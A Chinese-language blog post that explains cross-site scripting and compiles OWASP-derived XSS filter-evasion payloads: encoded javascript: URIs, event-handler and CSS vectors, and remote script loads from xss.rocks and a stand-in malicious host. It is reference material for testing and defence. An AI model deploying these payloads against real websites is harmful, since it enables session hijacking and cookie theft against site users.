---
layout: post
title: XSS, Cross-Site Scripting 跨站脚本攻击
categories: [dev, web]
tags: [javascript, security, xss, filter-evasion, xss-vector]
---

* 参考
  * [OWASP - OWASP Testing Guide v4 Table of Contents](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)
  * [OWASP - OWASP Testing Guide Appendix C: Fuzz Vectors](https://www.owasp.org/index.php/OWASP_Testing_Guide_Appendix_C:_Fuzz_Vectors#Cross_Site_Scripting_.28XSS.29)
  * [OWASP - XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
  * [OWASP - XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)
  * [OWASP - Testing for Cross site scripting](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
  * <http://blog.bugcrowd.com/xss-polyglots-the-context-contest>

## 概述

XSS : Cross-Site Scripting 跨站脚本

能注入恶意HTML/Javascript代码到用户浏览的网页上，达到劫持用户会话的目的。

XSS跨站脚本攻击本身对Web服务器没有直接危害，借助网站进行传播，危害网站的用户。

### XSS简单的例子

![](xss-simple-sample.png)

### XSS可能的危害

1. 网络钓鱼，包括盗取各类用户帐号；
2. 窃取用户cookies，获取隐私信息，或利用用户省份进一步对网站执行操作；
3. 劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账等
4. 强制弹出广告页面，刷流量等
5. 网页挂马；
6. 进行大量的客户端攻击，如 DDos攻击；
7. 获取客户端信息，例如用户的浏览历史记录、真实IP等
8. 。。。


## XSS分类

### 反射性XSS ， Reflected Cross-Site Scripting

也称非持久型、参数型跨站脚本。主要用于将恶意脚本附加到URL地址的参数中。

例如：

~~~
http://www.test.com/search.php?key="><script>alert("XSS")</script>"
~~~

url转码成不易读的形式，更具有迷惑性。


### 持久型 XSS , Persistent Cross-site Scripting

也称存储型XSS（Stored Cross-site Scripting），比反射型XSS更具威胁，可能影响到Web服务器自身安全。

持久型XSS，恶意脚本被存储到客户端或者服务器的数据库中，当其他用户浏览该网页时，站点即从数据库中读取恶意用户存入的非法数据，显示在页面中，即在受害者主机上的浏览器执行恶意代码。



## XSS CheatSheet / XSS vectors

~~~

<!-- Replacive fuzzing -->

http://www.example.com/>"><script>alert("XSS")</script>&
http://www.example.com/'';!--"<XSS>=&{()}

>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;
 alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>

>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
">
>"
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')> 
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
 &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
 &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>
           
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
 &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
~~~

### 基本XSS，不回避任何 filter

~~~
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
~~~

* http://xss.rocks/xss.js 的内容
    ~~~ javascript
    /* This file is based on the file from http://ha.ckers.org/xss.js
       It has been reproduced here due to the extended downtime of ha.ckers.org
       This file is being hosted as a courtesy to the security community.
    */

    document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
    alert ("This is remote text via xss.js located at xss.rocks " + document.cookie);
    ~~~

### 绕过大小写检查


#### 使用VBScript绕过大小写

Since JavaScript is case sensitive, some people attempt to filter XSS by converting all characters to upper case, rendering Cross Site Scripting utilizing inline JavaScript useless. If this is the case, you may want to use `VBScript` since it is not a case sensitive language.

~~~ html
<!-- javascript -->
<script>alert(document.cookie);</script>

<!-- vbscript -->
<script type="text/vbscript">alert(DOCUMENT.COOKIE)</script>
~~~


### 转义尖括号 \< \>

~~~ html
<script src=http://www.example.com/malicious-code.js></script>

%3cscript src=http://www.example.com/malicious-code.js%3e%3c/script%3e

\x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
~~~

### 利用 `fromCharCode` 转义

~~~
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
~~~

### 从 `javascript:` 注入

~~~
<IMG SRC="javascript:alert('XSS');">
~~~

~~~
<IMG SRC=javascript:alert('XSS')>
~~~

#### 利用大小写回避检查

~~~
<IMG SRC=JaVaScRiPt:alert('XSS')>
~~~


#### HTML entities 转移单引号

~~~
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
~~~


#### \` 尖号混淆

~~~
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
~~~


### 回避 SRC 检查

~~~
<IMG SRC=# onmouseover="alert('xxs')">
~~~

~~~
<IMG SRC= onmouseover="alert('xxs')">
~~~

~~~
<IMG onmouseover="alert('xxs')">
~~~


### On error alert

~~~
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
~~~

#### IMG onerror and javascript alert encode

~~~
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
~~~

#### Decimal HTML character references

all of the XSS examples that use a javascript: directive inside of an \<IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode). 

~~~
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
&#39;&#88;&#83;&#83;&#39;&#41;>
~~~

#### Decimal HTML character references without trailing semicolons

This is often effective in XSS that attempts to look for "&#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like `$tmp_string =~ s/.*\&#(\d+);.*/$1/;` which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):

~~~
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
~~~




#### Hexadecimal HTML character references without trailing semicolons

This is also a viable XSS attack against the above string `$tmp_string =~ s/.*\&#(\d+);.*/$1/;` which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters). 

~~~
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
~~~


### Embedded tab

~~~
<IMG SRC="jav	ascript:alert('XSS');">
~~~

#### Embedded Encoded tab

~~~
<IMG SRC="jav&#x09;ascript:alert('XSS');">
~~~


### Embedded newline to break up XSS

Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector: 

~~~
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
~~~

### Embedded carriage return to break up XSS

~~~
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
~~~


### Null breaks up JavaScript directive

Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use `%00` in the URL string or if you want to write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file.

~~~ perl
print "<IMG SRC=java\0script:alert(\"XSS\")>";
~~~


### Spaces and meta chars before the JavaScript in images for XSS

有的系统假设 `"javascript:"` 的引号内没有空格之类的字符，只做全匹配。

就可以使用 1～32 的任一字符注入：

~~~
<IMG SRC=" &#14;  javascript:alert('XSS');">
~~~



### Escaping JavaScript escapes

~~~
\";alert('XSS');//
~~~

被服务器端直接用于js `<SCRIPT>var a="$ENV{QUERY_STRING}";</SCRIPT>` 中，就可能变成

~~~
<SCRIPT>var a="\\";alert('XSS');//";</SCRIPT>
~~~

也可以使用 `</script><script>` 嵌入新的script元素，效果如下：

~~~
</script><script>alert('XSS');</script>
~~~


### End title tag

~~~
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
~~~

### INPUT image

~~~
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
~~~

### BODY image

~~~
<BODY BACKGROUND="javascript:alert('XSS')">
~~~

### IMG Dynsrc

~~~
<IMG DYNSRC="javascript:alert('XSS')">
~~~

### IMG lowsrc

~~~
<IMG LOWSRC="javascript:alert('XSS')">
~~~

### 从 Tag 注入

#### SVG object tag

~~~
<svg/onload=alert('XSS')>
~~~


### 从CSS注入

#### List-style-image

~~~
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
~~~

#### STYLE sheet

~~~
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
~~~

#### Remote style sheet

This only works in IE and Netscape 8.1+ in IE rendering engine mode. 

~~~
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
~~~

#### Remote style sheet part 2

As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world: 

~~~
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
~~~

#### Remote style sheet part 3

According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). 

~~~
<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
~~~

#### Remote style sheet part 4

This only works in Gecko rendering engines and works by binding an XUL file to the parent page.

~~~
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
~~~

#### STYLE tags with broken up JavaScript for XSS

~~~
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
~~~

#### STYLE attribute using a comment to break up expression

Created by Roman Ivanov

~~~
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
~~~

#### IMG STYLE with expression

This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:

~~~
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
~~~

#### STYLE tag using background-image

~~~
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
~~~

#### STYLE tag using background

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>


#### Anonymous HTML with STYLE attribute

IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:

~~~
<XSS STYLE="xss:expression(alert('XSS'))">
~~~




### US-ASCII encoding

US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.

~~~
¼script¾alert(¢XSS¢)¼/script¾
~~~



### META

The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs: 

~~~
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
~~~


#### META using data

Directive URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. 

~~~
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
~~~

`PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K` base64 decode: `<script>alert('XSS')</script>`

#### META with additional URL parameter

If the target website attempts to see if the URL contains "http://" at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):

~~~
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
~~~



### IFRAME

If iframes are allowed there are a lot of other XSS problems as well:

~~~
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
~~~

#### IFRAME Event based

IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)

~~~
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
~~~

#### FRAME

Frames have the same sorts of XSS problems as iframes

~~~
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
~~~


### TABLE

~~~
<TABLE BACKGROUND="javascript:alert('XSS')">
~~~

#### TD

Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

~~~
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
~~~



### DIV

#### DIV background-image

~~~
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
~~~

#### DIV background-image with unicoded XSS exploit

This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:

~~~
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
~~~







### ECMAScript 6

~~~
Set.constructor`alert\x28document.domain\x29```
~~~


### BODY tag

~~~
<BODY ONLOAD=alert('XSS')>
~~~




### VBScript

#### VBscript in an image

~~~
<IMG SRC='vbscript:msgbox("XSS")'>
~~~



### 利用浏览器兼容的语法错误

#### Malformed A tags

Chrome loves to replace missing quotes for you...

~~~
<a onmouseover=alert(document.cookie)>xxs link</a> 
~~~

#### Malformed IMG tags

Originally found by Begeek (but cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.

~~~
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
~~~


#### Non-alpha-non-digit XSS

一些非字母非数字的字符会被浏览器无视。

~~~
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
~~~

~~~
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
~~~

~~~
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
~~~


#### Extraneous open brackets

Submitted by Franz Sedlmaier, 这种方法能搞定匹配尖括号的XSS过滤。

* 下例 `//` 用来避免js报错：
    ~~~
    <<SCRIPT>alert("XSS");//<</SCRIPT>
    ~~~


#### No closing script tags

Firefox assumes it's safe to close the HTML tag and add closing tags for you. 

~~~
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
~~~

#### Protocol resolution in script tags

This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a `</SCRIPT>` tag at the end. 

~~~
<SCRIPT SRC=//xss.rocks/.j>
~~~


#### Half open HTML/JavaScript XSS vector

Unlike Firefox the IE rendering engine doesn't add extra data to your page, but it does allow the `javascript:` directive in images.

This is useful as a vector because it doesn't require a close angle bracket. 

也可以用 `<IFRAME` 代替 `<IMG`

~~~
<IMG SRC="javascript:alert('XSS')"
~~~

#### Double open angle brackets

~~~
<iframe src=http://xss.rocks/scriptlet.html <
~~~

### BGSOUND

~~~
<BGSOUND SRC="javascript:alert('XSS');">
~~~

### & JavaScript includes

~~~
<BR SIZE="&{alert('XSS')}">
~~~


## Event Handlers

* FSCommand() (attacker can use this when executed from within an embedded Flash object)
* onAbort() (when user aborts the loading of an image)
* onActivate() (when object is set as the active element)
* onAfterPrint() (activates after user prints or previews print job)
* onAfterUpdate() (activates on data object after updating data in the source object)
* onBeforeActivate() (fires before the object is set as the active element)
* onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
* onBeforeCut() (attacker executes the attack string right before a selection is cut)
* onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
* onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
* onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
* onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
* onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
* onBeforeUpdate() (activates on data object before updating data in the source object)
* onBegin() (the onbegin event fires immediately when the element's timeline begins)
* onBlur() (in the case where another popup is loaded and window looses focus)
* onBounce() (fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
* onCellChange() (fires when data changes in the data provider)
* onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
* onClick() (someone clicks on a form)
* onContextMenu() (user would need to right click on attack area)
* onControlSelect() (fires when the user is about to make a control selection of the object)
* onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)
* onCut() (user needs to copy something or it can be exploited using the execCommand("Cut") command)
* onDataAvailable() (user would need to change data in an element, or attacker could perform the same function)
* onDataSetChanged() (fires when the data set exposed by a data source object changes)
* onDataSetComplete() (fires to indicate that all data is available from the data source object)
* onDblClick() (user double-clicks a form element or a link)
* onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)
* onDrag() (requires that the user drags an object)
* onDragEnd() (requires that the user drags an object)
* onDragLeave() (requires that the user drags an object off a valid location)
* onDragEnter() (requires that the user drags an object into a valid location)
* onDragOver() (requires that the user drags an object into a valid location)
* onDragDrop() (user drops an object (e.g. file) onto the browser window)
* onDragStart() (occurs when user starts drag operation)
* onDrop() (user drops an object (e.g. file) onto the browser window)
* onEnd() (the onEnd event fires when the timeline ends.
* onError() (loading of a document or image causes an error)
* onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object)
* onFilterChange() (fires when a visual filter completes state change)
* onFinish() (attacker can create the exploit when marquee is finished looping)
* onFocus() (attacker executes the attack string when the window gets focus)
* onFocusIn() (attacker executes the attack string when window gets focus)
* onFocusOut() (attacker executes the attack string when window looses focus)
* onHashChange() (fires when the fragment identifier part of the document's current address changed)
* onHelp() (attacker executes the attack string when users hits F1 while the window is in focus)
* onInput() (the text content of an element is changed through the user interface)
* onKeyDown() (user depresses a key)
* onKeyPress() (user presses or holds down a key)
* onKeyUp() (user releases a key)
* onLayoutComplete() (user would have to print or print preview)
* onLoad() (attacker executes the attack string after the window loads)
* onLoseCapture() (can be exploited by the releaseCapture() method)
* onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)
* onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)
* onMessage() (fire when the document received a message)
* onMouseDown() (the attacker would need to get the user to click on an image)
* onMouseEnter() (cursor moves over an object or area)
* onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)
* onMouseMove() (the attacker would need to get the user to mouse over an image or table)
* onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)
* onMouseOver() (cursor moves over an object or area)
* onMouseUp() (the attacker would need to get the user to click on an image)
* onMouseWheel() (the attacker would need to get the user to use their mouse wheel)
* onMove() (user or attacker would move the page)
* onMoveEnd() (user or attacker would move the page)
* onMoveStart() (user or attacker would move the page)
* onOffline() (occurs if the browser is working in online mode and it starts to work offline)
* onOnline() (occurs if the browser is working in offline mode and it starts to work online)
* onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)
* onPaste() (user would need to paste or attacker could use the execCommand("Paste") function)
* onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)
* onPopState() (fires when user navigated the session history)
* onProgress() (attacker would use this as a flash movie was loading)
* onPropertyChange() (user or attacker would need to change an element property)
* onReadyStateChange() (user or attacker would need to change an element property)
* onRedo() (user went forward in undo transaction history)
* onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)
* onReset() (user or attacker resets a form)
* onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
* onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
* onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)
* onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
* onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
* onRowsEnter() (user or attacker would need to change a row in a data source)
* onRowExit() (user or attacker would need to change a row in a data source)
* onRowDelete() (user or attacker would need to delete a row in a data source)
* onRowInserted() (user or attacker would need to insert a row in a data source)
* onScroll() (user would need to scroll, or attacker could use the scrollBy() function)
* onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward)
* onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
* onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
* onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand("SelectAll");)
* onStart() (fires at the beginning of each marquee loop)
* onStop() (user would need to press the stop button or leave the webpage)
* onStorage() (storage area changed)
* onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire)
* onSubmit() (requires attacker or user submits a form)
* onTimeError() (user or attacker sets a time property, such as dur, to an invalid value)
* onTrackChange() (user or attacker changes track in a playList)
* onUndo() (user went backward in undo transaction history)
* onUnload() (as the user clicks any link or presses the back button or attacker forces a click)
* onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)
* seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)





## 附录

### OWASP , Open Web Application Security Project

知名Web安全和数据库安全研究组织

### English 术语对照

XSS Vector 
: 用来注入的XSS脚本字符串

Polyglot [wiki](https://en.wikipedia.org/wiki/Polyglot_(computing))
: In computing, a polyglot is a computer program or script written in a valid form of multiple programming languages, which performs the same operations or output independent of the programming language used to compile or interpret it.








































































